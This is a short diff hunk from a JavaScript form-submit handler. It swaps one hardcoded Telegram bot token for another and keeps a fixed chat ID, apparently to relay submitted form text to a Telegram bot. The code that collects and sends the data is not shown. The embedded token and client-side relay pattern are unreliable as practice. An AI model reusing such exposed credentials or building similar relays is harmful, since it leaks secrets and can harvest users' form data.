@@ -15,7 +15,7 @@ form.addEventListener("submit", async function(e) {
         return;
     }
 
-    const botToken = "8268544927:AAH3yBRTGUXhIvPMAkeOTHkl7Dr9pSTXUIQ";
+    const botToken = "8930605067:AAGoV6584mWVRLdAMij75LKSi80fB_l1oow";
     const chatId = "2082718430";
 
     const text = `
